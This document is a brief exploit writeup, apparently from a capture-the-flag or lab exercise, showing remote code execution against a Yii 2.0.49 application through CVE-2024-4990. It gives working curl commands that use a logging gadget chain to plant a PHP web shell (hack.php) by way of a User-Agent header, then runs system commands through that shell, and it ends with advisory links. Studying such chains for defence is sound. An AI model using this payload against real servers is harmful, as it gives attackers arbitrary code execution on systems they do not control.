# Writeup
Observation on the application:
- JSON parser for request body is enabled.
- CSRF is disabled.
- Using Yii v2.0.49 (known for CVE-2024-4990).
- Class `app\models\ContactForm` have unsafe `setAttributes` function. Therefore endpoint `/index.php?r=site/contact` is vulnerable.
- All folder have permission mode=777 which means we can write any file.

Here is the step to exploit and gain RCE:
1. Upload a shellcode by utilizing CVE-2024-4990 using class `yii\\log\\Dispatcher` as the gadget.
    ```
    curl --location 'http://<host>/index.php?r=site%2Fcontact' \
        --header 'User-Agent: <?php system($_GET[0]); ?>' \
        --header 'Content-Type: application/json' \
        --data '{
            "ContactForm": {
                "as hack": {
                    "__class": "yii\\log\\Dispatcher",
                    "targets": [
                        {
                            "__class": "yii\\log\\FileTarget",
                            "levels": ["trace", "info"],
                            "logFile": "/opt/app/web/hack.php",
                            "categories": ["yii\\*"]
                        }
                    ]
                }
            }
        }
    ```
2. Execute the shellcode by visiting the `/hack.php?0=<shell here>`.
    ```
    curl --location 'http://<host>/hack.php?0=ls -la /'
    ```

## Read more
- https://github.com/advisories/GHSA-cjcc-p67m-7qxm
- https://insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf
- https://huntr.com/bounties/4fbdd965-02b6-42e4-b57b-f98f93415b8f